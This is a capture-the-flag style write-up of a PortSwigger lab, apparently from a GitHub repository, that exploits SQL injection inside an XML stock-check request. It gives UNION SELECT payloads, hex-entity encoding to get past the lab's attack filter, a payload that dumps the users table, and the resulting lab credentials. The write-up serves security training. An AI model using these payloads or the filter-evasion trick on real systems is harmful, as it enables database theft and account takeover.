## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5ba2c810-d187-415d-bc3d-5f7609d820d1)

## Solution :

Observe that the stock check feature sends the productId and storeId to the application in XML format.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/20e5dd68-acd4-406d-90a3-41e68d361476)


Send the POST /product/stock request to Burp Repeater.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/aa756ef4-d202-493f-bb99-a33f94ceea9a)

replacing the ID with mathematical expressions that evaluate to other potential IDs

```sql
<storeId>1 UNION SELECT NULL</storeId>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/9e8870ee-dede-407d-9395-a92713444519)

Observe that your request has been blocked due to being flagged as a potential attack.so that we encode the query . One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2f545756-050e-4737-afc1-c717e0b74aec)

now the attack is not being detected.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/51f8e0c1-40c6-4e88-94f9-5b0b22ec14a1)

```sql
<storeId>1 UNION SELECT NULL NULL </storeId>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/ce292faf-b773-4f9a-8a6b-d20ed3182b4f)

The application returns `0 units` This means two colums are there with one containing the username and passward.

As you can only return one column, you need to concatenate the returned usernames and passwords.

The query after encoding will be will be 

```sql
<storeId> <@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/e75f5ad1-4e95-4602-8e01-de35c47f67c1)


The usernames and passwords of registered users.

`administrator~0mrweme56i1int0ujttq`

`carlos~yat7sjqe9pnxnwlycaw7`

`wiener~q1dnsto3yfy2bu59ht2q`

we will use `administrator~0mrweme56i1int0ujttq` this credentail to login.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/5e3bb4ed-63df-461d-9eb3-79e1528f033f)

Lab solved .





